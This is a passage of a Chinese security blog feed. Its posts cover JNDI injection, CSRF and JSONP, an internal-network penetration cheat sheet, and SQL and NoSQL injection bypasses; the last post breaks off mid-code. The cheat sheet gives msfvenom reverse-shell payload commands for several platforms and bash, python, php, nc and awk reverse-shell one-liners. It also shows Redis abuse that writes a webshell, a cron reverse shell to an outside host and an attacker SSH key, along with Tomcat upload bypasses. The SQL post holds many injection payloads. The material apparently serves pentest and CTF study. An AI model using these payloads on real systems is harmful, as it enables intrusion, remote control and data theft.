title="JNDI注入"></a>JNDI注入</h2><p>那么如果 <code>lookup</code> 的参数可控呢？</p><p>比如将其改为</p><pre><code>ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</code></pre><p>Exploit.java</p><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:37 **/public class Exploit {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;calc.exe&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>编译好之后，放到一个web目录下</p><p><img src="/posts/fe658142/1584867473029.png" alt></p><p>然后开启RMI服务</p><pre><code>java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8002/#Exploit 1099</code></pre><p><img src="/posts/fe658142/1584867499037.png" alt></p><p>运行即可弹出计算器</p><p><img src="/posts/fe658142/1584867538545.png" alt></p><p><img src="/posts/fe658142/1584867555946.png" alt></p><blockquote><p>在调试的时候遇到了一个问题，java版本不兼容，由于我电脑上存在java7和java8，会报错</p><p><img src="/posts/fe658142/1584867717633.png" alt></p><p><a href="https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></p></blockquote><h2 id="spring-JNDI注入"><a href="#spring-JNDI注入" class="headerlink" title="spring JNDI注入"></a>spring JNDI注入</h2><p>利用链：</p><p><code>JtaTransactionManager</code></p><p><img src="/posts/fe658142/1584868292042.png" alt></p><p>跟进 <code>initUserTransactionAndTransactionManager</code></p><p><img src="/posts/fe658142/1584874126510.png" alt></p><p>继续跟进 <code>lookupUserTransaction</code> 方法</p><p><img src="/posts/fe658142/1584874158465.png" alt></p><p>可以看到调用了lookup,而且我们可以看到整个调用链只要我们可控<code>userTransactionName</code>就可以,</p><p><img src="/posts/fe658142/1584874198634.png" alt></p><p>调用链比较简单，最后控制属性即可</p><pre><code class="java">org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();object.setUserTransactionName(jndiAddress);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF相关总结</title>
      <link href="/posts/f70b79f3/"/>
      <url>/posts/f70b79f3/</url>
      
        <content type="html"><![CDATA[<p>刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</p><p>同源是指，<strong>域名，协议，端口相同</strong></p><p>跨域的种类</p><ul><li>协议不同</li><li>端口不同</li><li>主域名不同</li><li>子域名不同</li></ul><p>允许跨域的标签</p><pre><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;&lt;img src=&quot;...&quot;&gt;&lt;video src=&quot;...&quot;&gt;&lt;/video&gt;&lt;audio src=&quot;...&quot;&gt;&lt;/audio&gt;&lt;embed src=&quot;...&quot;&gt;&lt;frame src=&quot;...&quot;&gt;&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;&lt;applet code=&quot;...&quot;&gt;&lt;/applet&gt;&lt;object data=&quot;...&quot; &gt;&lt;/object&gt;</code></pre><p>同源策略虽然感觉很陌生，但确实前端的基石，地位类似于在牛顿定律在力学中的地位</p><p>试想没有同源策略的话，那么任何一个网页都可以随意操控其他网页的数据，那真的是web世界的灾难。就像牛顿定律如果失效，估计地球都不知道怎么绕太阳转了</p><p><strong>重点：</strong></p><p><strong>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了</strong>。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。</p><h2 id="如何跨域？"><a href="#如何跨域？" class="headerlink" title="如何跨域？"></a>如何跨域？</h2><p>跨域是必须的，因为同源策略的限制太严格了，子域名居然也和域名不同源！</p><ol><li>设置window.domain</li></ol><p>浏览器允许通过设置 <code>document.domain</code> 来共享cookie</p><ol start="2"><li>cookie本身的domain属性</li></ol><p>cookie本身可以设置 <code>domain</code> 属性，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。那么二级和三级域名也可以读取到cookie    </p><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><p>声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</p><p>创建一个<code>&lt;script&gt;</code>标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。</p><p>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是<code>show(&#39;我不爱你&#39;)</code>。</p><p>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。</p><p>一个典型的jsonp攻击的代码</p><pre><code class="js">&lt;script&gt;function wooyun(v){    alert(v.username);}&lt;/script&gt;&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</code></pre><p>发送请求过去之后，服务端返回了数据，然后就被弹出来了</p><p>遇到过的一个CTF题目</p><pre><code>&lt;script/src=&amp;unit=https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&gt;&lt;/script&gt;</code></pre><h4 id="防御jsonp攻击"><a href="#防御jsonp攻击" class="headerlink" title="防御jsonp攻击"></a>防御jsonp攻击</h4><p>验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <code>&lt;script&gt;</code> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的</p><ol><li>正则过滤不严谨</li><li>空referer</li></ol><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h3><p>允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。</p><p>区分简单请求和非简单请求：</p><pre><code>（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>满足以上要求即是简单请求</p><p>重点在最后一句： </p><blockquote><p>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</p></blockquote><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。这个字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8</code></pre><p>Access-Control-Allow-Origin： 要么是 origin 的值，要么就是 *</p><p>Access-Control-Allow-Credentials: 它的值是一个布尔值，表示是否允许发送Cookie。如果不要的话就删除这个字段</p><p>Access-Control-Expose-Headers：如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。</p><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p><h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>cookie的五大属性:“path, domain, expire, HttpOnly, Secure”，很少有人了解到cookie还有一个SameSite属性，这是一个专门用于防止csrf漏洞的属性。</p><ol><li>http-only:</li></ol><p>浏览器会禁止页面中的 JavaScript 访问带有 HttpOnly 属性的 Cookie</p><ol start="2"><li>domain</li></ol><p>domain标识域，如域A为t1.test.com，域B为t2.test.com，那么在域A生产一个令域A和域B都能访问的cookie就要将该cookie的domain设置为.test.com</p><ol start="3"><li>expire</li></ol><p>过期时间</p><ol start="4"><li>Secure</li></ol><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><ol start="5"><li>path</li></ol><p>path表示cookie所在的目录</p><h3 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h3><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><h3 id="samsite属性"><a href="#samsite属性" class="headerlink" title="samsite属性"></a>samsite属性</h3><p>面试真实问题：vue开发的前后端项目如何避免CSRF？</p><p>查到的解决方案：</p><ol><li>如果后端用Django开发，可以通过传递CSRF token过来</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透常见知识</title>
      <link href="/posts/6941c9ee/"/>
      <url>/posts/6941c9ee/</url>
      
        <content type="html"><![CDATA[<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>参数：</p><ul><li><p><code>-l</code> 列出相关的值，这些值包括 <code>payloads, encoders, nops, platforms, archs, encrypt, formats, all</code></p></li><li><p><code>-b</code> badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中</p></li><li><p><code>-e</code> 开启payload编码</p></li></ul><pre><code>msfvenom -l encoders 列出所有的编码器</code></pre><p>其中比较强大的有：</p><p><code>x86/shikata_ga_nai, cmd/powershell_base64</code></p><ul><li><code>-i</code> 指定编码次数</li><li><code>-x</code> 指定一个特定的可执行文件作为模板，常与 <code>-k</code> 联合使用，保护模板程序的功能，注入的payload作为一个新的进程运行</li><li><code>-n</code> 指定填充的nop数量</li></ul><h3 id="常用payload生成命令"><a href="#常用payload生成命令" class="headerlink" title="常用payload生成命令"></a>常用payload生成命令</h3><p>Windows (避免坏字节的出现)</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcpLHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</code></pre><p>Android</p><pre><code>//需要签名msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><p>powershell</p><pre><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</code></pre><p>Linux</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</code></pre><p>php</p><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</code></pre><p>war</p><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war</code></pre><p>war包和jar包区别：</p><blockquote><p>war包是java web打的包，可以直接丢到tomcat的webapp目录下运行，jar包是java应用程序打的包，像spring boot打包就是jar，因为内置了web服务器</p></blockquote><p>python</p><pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</code></pre><p>Windows shellcode</p><pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><p>Linux shellcode</p><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h2 id="常用反弹shell"><a href="#常用反弹shell" class="headerlink" title="常用反弹shell"></a>常用反弹shell</h2><p>github项目：<a href="https://github.com/m0rph-1/revshellgen" target="_blank" rel="noopener">https://github.com/m0rph-1/revshellgen</a> 可以很方便地生成各种形式的反弹shell命令</p><p>bash反弹shell</p><pre><code>~/revshellgen (master ✔) ᐅ python revshellgen.py -i 127.0.0.1 -p 1234 -t bash[+] Reverse shell command:bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</code></pre><p>python反弹shell</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>nc反弹shell</p><pre><code>ncat 127.0.0.1 1234 -e /bin/shrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 1234 &gt;/tmp/f</code></pre><p>awk反弹shell</p><pre><code>awk &#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/1234&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre><p>nc-pipe</p><pre><code>/bin/sh | nc 127.0.0.1 1234</code></pre><h2 id="tomcat常见漏洞"><a href="#tomcat常见漏洞" class="headerlink" title="tomcat常见漏洞"></a>tomcat常见漏洞</h2><h3 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><code>/conf/web.xml</code> 文件中的readonly为false</p><pre><code>&lt;init-param&gt;    &lt;param-name&gt;readonly&lt;/param-name&gt;    &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>之后就可以通过PUT方式上传文件，但是 <code>.jsp</code> 的后缀会被限制</p><p>绕过方式：</p><ul><li>Windows文件名加空格 <code>PUT /x.jsp%20 HTTP/1.1</code> 上传之后在Windows下空格会被去掉</li><li>NTFS流， <code>PUT /x.jsp::$DATA HTTP/1.1</code></li><li><code>/</code>在文件名中是非法的，也会被去除（Linux/Windows) <code>PUT /x.jsp/ HTTP/1.1</code></li></ul><h3 id="tomcat-后台部署war包漏洞"><a href="#tomcat-后台部署war包漏洞" class="headerlink" title="tomcat 后台部署war包漏洞"></a>tomcat 后台部署war包漏洞</h3><p><code>tomcat-users.xml</code> 修改配置</p><pre><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;&lt;user username=&quot;both&quot; password=&quot;admin&quot; roles=&quot;tomcat,role1&quot;/&gt;&lt;user username=&quot;role1&quot; password=&quot;admin&quot; roles=&quot;role1&quot;/&gt;</code></pre><p>之后访问到 <code>http://127.0.0.1:8080/manager</code></p><p>写一个shell.jsp，打包之后改名为war包上传即可getshell(也可以用msf生成一个war包)</p><h3 id="tomcat目录遍历"><a href="#tomcat目录遍历" class="headerlink" title="tomcat目录遍历"></a>tomcat目录遍历</h3><p><code>web.xml</code> 中如果 <code>listings</code> 参数为true，导致目录遍历漏洞</p><p><img src="/posts/6941c9ee/1584495111390.png" alt> </p><h2 id="redis常见漏洞"><a href="#redis常见漏洞" class="headerlink" title="redis常见漏洞"></a>redis常见漏洞</h2><p>给你一个未授权访问redis，你能做啥？</p><h3 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h3><pre><code>config set dir /var/www/htmlconfig set dbfilename redis.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save</code></pre><h3 id="写crontab反弹shell"><a href="#写crontab反弹shell" class="headerlink" title="写crontab反弹shell"></a>写crontab反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="写ssh-keygen公钥"><a href="#写ssh-keygen公钥" class="headerlink" title="写ssh-keygen公钥"></a>写ssh-keygen公钥</h3><p>在以下条件下，可以利用此方法</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p><code>ssh-keygen -t rsa</code> 生成一对公私钥</p><p>然后redis执行命令，注意写入的公钥必须要前后分别加个换行</p><pre><code>192.168.63.130:6379&gt; config set dir /root/.ssh/OK192.168.63.130:6379&gt; config set dbfilename authorized_keysOK192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;OK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h2 id="phpmyadmin常见漏洞"><a href="#phpmyadmin常见漏洞" class="headerlink" title="phpmyadmin常见漏洞"></a>phpmyadmin常见漏洞</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/256#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/256#toc-2</a></p><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel POP链讲解</title>
      <link href="/posts/898eeda9/"/>
      <url>/posts/898eeda9/</url>
      
        <content type="html"><![CDATA[<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=90514239&cid=154578272&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="480" width="780"> </iframe></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/posts/9b13a55/"/>
      <url>/posts/9b13a55/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><pre><code>char()</code></pre><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><pre><code>1 union select 1, table_name from information_schema.tables where table_name = &#39;users&#39;select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p><pre><code class="sql">union select 1,2     #等价于union select * from (select 1)a join (select 2)bmysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+1 row in set (0.00 sec)</code></pre><p>使用like</p><pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于select user() like &#39;r%&#39;mysql&gt; select user() like &#39;r%&#39;;+------------------+| user() like &#39;r%&#39; |+------------------+|                1 |+------------------+1 row in set (0.00 sec)</code></pre><p>对于 <code>limit</code> 可以使用 offset绕过</p><pre><code class="sql">select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0</code></pre><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><pre><code># 猜解user()第一个字符的ascii码是否小于等于150时ascii(mid(user(),1,1)) &lt;= 150=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><pre><code># 用户名为usernameSQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="绕过-information-被过滤"><a href="#绕过-information-被过滤" class="headerlink" title="绕过 information 被过滤"></a>绕过 information 被过滤</h3><ol><li>MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。<br>如果waf掉了<code>information</code>我们可以利用这两个表注入数据库名和表名。</li><li>参考 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li></ol><p>MySQl5.7的新特性</p><ul><li>sys.schema_auto_increment_columns  该视图的作用简单来说就是用来对表自增ID的监控。</li><li>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</li></ul><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><pre><code>mysql&gt; select * from user;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |+----+----------+----------------------------------+1 row in set (0.00 sec)</code></pre><p>测试</p><pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);Empty set (2.00 sec)mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by 后的数字可以作为一个注入点</p><p>报错注入</p><pre><code>mysql&gt; select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;</code></pre><p>时间盲注</p><pre><code>select * from flag order by 1 and if(1=1,sleep(3), NULL);</code></pre><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p><p>报错注入</p><pre><code>mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;</code></pre><p>时间注入</p><pre><code>select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</code></pre><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">例题链接</a></p><blockquote><p>过滤了空格和or，并且没办法绕过过滤or</p><p>同时不知道列名</p><p>payload: <code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p></blockquote><p>这样在不知道列名的情况下，就可以给每一列取一个别名了</p><pre><code>mysql&gt; select 1,2,3 union select * from user;+---+-------+--------+| 1 | 2     | 3      |+---+-------+--------+| 1 | 2     | 3      || 1 | admin | mysql  || 2 | hhh   | 123    || 3 | aaaaa | cccccc |+---+-------+--------+4 rows in set (0.00 sec)</code></pre><p>查询</p><pre><code>mysql&gt; select group_concat(b) from (select 1,2,3 as b union select * from user)a;+--------------------+| group_concat(b)    |+--------------------+| 3,mysql,123,cccccc |+--------------------+1 row in set (0.00 sec)</code></pre><p>查询两列数据</p><pre><code>select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;</code></pre><p>查询一行数据</p><pre><code>select `2` from (select 1,2,3 union select * from users)a limit 1,1;</code></pre><p><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入参考</a></p><p><strong>使用join进行无列名注入</strong></p><p>这样就能依次把列名都爆出来了</p><pre><code>mysql&gt; select * from user;+---------+-----------+-----------+| user_id | user_name | user_pass |+---------+-----------+-----------+|       1 | admin     | mysql     ||       2 | hhh       | 123       ||       3 | aaaaa     | cccccc    |+---------+-----------+-----------+3 rows in set (0.00 sec)mysql&gt; select*from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;user_id&#39;mysql&gt; select*from (select * from user as a join user b using(user_id))c;ERROR 1060 (42S21): Duplicate column name &#39;user_name&#39;</code></pre><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>以mongodb为例</p><pre><code>db.collection.find(query, projection)//query 可选，使用查询操作符指定查询条件//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）举例：//查找username为JrXnm的信息db.user.find({&#39;username&#39;:&#39;JrXnm&#39;}) </code></pre><p>第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。</p><p>第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。</p><p>PHP永真式注入</p><pre><code>$data = array(    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]); $cursor = 